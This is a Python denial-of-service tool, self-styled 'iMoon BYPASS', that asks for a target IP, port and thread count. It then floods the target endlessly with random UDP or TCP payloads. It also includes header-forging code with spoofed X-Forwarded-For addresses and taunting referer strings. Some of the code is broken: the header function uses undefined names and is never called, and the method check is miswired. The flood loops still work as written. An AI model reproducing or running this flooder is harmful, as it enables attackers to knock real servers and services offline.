import random
import socket
import threading
import os
import time

acceptall = [
     'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n',
     'Accept-Encoding: gzip, deflate\r\n',
     'Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n',
     'Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n',
     'Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n',
     'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n',
     'Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n',
     'Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n',
     'Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n',
     'Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n',
     'Accept: text/html, application/xhtml+xml',
     'Accept-Language: en-US,en;q=0.5\r\n',
     'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n',
     'Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n']

referers = [
'Attack By iMoon | Sended | Rip VPS!',
'Attack By iMoon | Sended | Rip VPS!',
'Attack By iMoon | Sended | Rip VPS!',
'Attack By iMoon | Sended | Rip VPS!',
'Attack By iMoon | Sended | Rip VPS!',
'Attack By iMoon | Sended | Rip VPS!',
'Attack By iMoon | Sended | Rip VPS!',
'Attack By iMoon | Sended | Rip VPS!',
'Attack By iMoon | Sended | Rip VPS!',
'Attack By iMoon | Sended | Rip VPS!',
'Attack By iMoon | Sended | Rip VPS!',
'Attack By iMoon | Sended | Rip VPS!',
'Attack By iMoon | Sended | Rip VPS!',
'Attack By iMoon | Sended | Rip VPS!',
'Attack By iMoon | Sended | Rip VPS!',
'Attack By iMoon | Sended | Rip VPS!',
'Attack By iMoon | Sended | Rip VPS!',
'Attack By iMoon | Sended | Rip VPS!',
'Attack By iMoon | Sended | Rip VPS!',
'Attack By iMoon | Sended | Rip VPS!']

os.system('color ' +random.choice(['A'])+ " & cls & title iMoon BYPASS")

password = input("[ + ] Password : ")
if password == "kontol":
    print("correct password")
    time.sleep(2)
else :
    print("Password wrong")
    time.sleep(100000000000000000000000000000)

print("User @Root = iMoon") 
ip = str(input(" $IP = "))
port = int(input(" $Port = "))
method = str(input(" $udp/tcp = "))
times = int(input(" $Packet = "))
threads = int(input(" $Threads = "))
fake_ip = '182.21.20.32'

def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assemebled

def Headers(method):
    header = ""
    if method == "udp" or method == "tcp":
        connection = "Connection: Keep-Alive\r\n"
        accept = random.choice(acceptall) + "\r\n"
        content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
        referer = "Referer: " + random.choice(referers) + ip + "\r\n"
        connection += "Cache-Control: max-age=0\r\n"
        connection += "pragma: no-cache\r\n"
        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
        randomip  = str(random.randint(1,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
        forward = "X-Forwarded-For: 1\r\n"
        forward += "Client-IP: 10000\r\n"
        length = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
        useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
        header = post_host + referer + forward + useragent + accept + content + connection +  length + "\r\n\r\n"
    return header

def run():
	data = random._urandom(10024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Request Overload")
		except:
			print("[?] $Request  sended" + "$root/iMoon" )

def run2():
	data = random._urandom(65813)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Request Overload")
		except:
			s.close()
			print("$Request Sended to ",ip," : ",port,"!")

for y in range(threads):
	if method == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
